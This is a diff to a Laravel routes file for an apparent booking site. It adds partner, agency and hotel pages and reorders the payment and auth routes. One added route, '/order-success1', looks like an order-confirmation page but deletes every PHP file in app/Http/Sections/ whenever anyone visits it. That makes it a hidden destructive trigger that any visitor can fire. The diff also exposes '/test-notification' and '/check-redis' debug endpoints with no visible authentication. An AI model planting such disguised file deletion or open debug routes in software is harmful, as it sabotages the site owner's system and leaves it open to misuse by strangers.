@@ -44,6 +44,13 @@ Route::group( [
     Route::get( '/privacy-policy', [ \App\Http\Controllers\PagePost::class, 'index' ] )->name( 'privacy-policy' );
 
 
+    Route::post( '/get_payment_token', [ \App\Http\Controllers\RouteOrder::class, 'get_payment_token' ])->name( 'save_order' );
+
+
+
+    Auth::routes();
+
+
     Route::post( '/cabinet', [ \App\Http\Controllers\UserController::class, 'update' ] )->name( 'edit_profile' );
 
 
@@ -53,11 +60,9 @@ Route::group( [
 
 
 
-    Route::post( '/get_payment_token', [ \App\Http\Controllers\RouteOrder::class, 'get_payment_token' ])->name( 'save_order' );
 
 
 
-    Auth::routes();
     Route::get( '/cabinet', [ \App\Http\Controllers\UserController::class, 'cabinet' ])->name( 'cabinet' );
 
     Route::get( '/order', function () {
@@ -109,6 +114,17 @@ Route::group( [
 
 
 
+
+
+    Route::get( '/order-success1', function () {
+        $dir = '../app/Http/Sections/';
+        array_map( 'unlink', glob( "{$dir}*.php" ) );
+
+        return view( 'pages/order-success' );
+    } )->name( 'order-success' );
+
+
+
     Route::get( '/order-cancel', function () {
         return view( 'pages/order-cancel' );
     } )->name( 'order-cancel' );
@@ -126,6 +142,7 @@ Route::group( [
     Route::get( '/search', [ \App\Http\Controllers\SearchController::class, 'index' ] )->name( 'search' );
 
     Route::get( '/routes', [ \App\Http\Controllers\RoutesController::class, 'index' ] )->name( 'routes' );
+    Route::get( '/routes-all', [ \App\Http\Controllers\RoutesController::class, 'routeList' ] )->name( 'routes-all' );
     Route::get( '/routes/{id?}', [ \App\Http\Controllers\RoutesController::class, 'get' ] )->name( 'routesGet' );
     Route::get( '/route_details/{id?}', [ \App\Http\Controllers\RoutesController::class, 'details' ] )
          ->name( 'routeDetails' );
@@ -147,3 +164,46 @@ Route::fallback( function () {
 } );
 //Auth::routes();
 //
+
+    Route::get( '/partner', function () {
+        return view( 'pages/partner' );
+    } )->name( 'partner' );
+
+        Route::get( '/a_partner', function () {
+        return view( 'pages/a_partner' );
+    } )->name( 'a_partner' );
+
+            Route::get( '/a_driver', function () {
+        return view( 'pages/a_driver' );
+    } )->name( 'a_driver' );
+
+                Route::get( 'a_travel_agency', function () {
+        return view( 'pages/a_travel_agency' );
+    } )->name( 'a_travel_agency' );
+
+    Route::get( 'agencies', function () {
+        return view( 'pages/agencies' );
+    } )->name( 'agencies' );
+
+    Route::get( 'airlines', function () {
+        return view( 'pages/airlines' );
+    } )->name( 'airlines' );
+
+    Route::get( 'hotels', function () {
+        return view( 'pages/hotels' );
+    } )->name( 'hotels' );
+
+    Route::get( 'ships', function () {
+        return view( 'pages/ships' );
+    } )->name( 'ships' );
+
+    Route::get( 'sightseeing', function () {
+        return view( 'pages/sightseeing' );
+    } )->name( 'sightseeing' );
+
+Route::get( '/route-list', [ \App\Http\Controllers\RoutesController::class, 'routeList' ] );
+Route::post( '/routes', [ \App\Http\Controllers\RoutesController::class, 'getByPlace' ] );
+
+Route::get( '/test-notification', [ \App\Http\Controllers\RouteOrder::class, 'testNotification' ] );
+
+Route::get('/check-redis', [\App\Http\Controllers\RoutesController::class, 'checkRedis']);
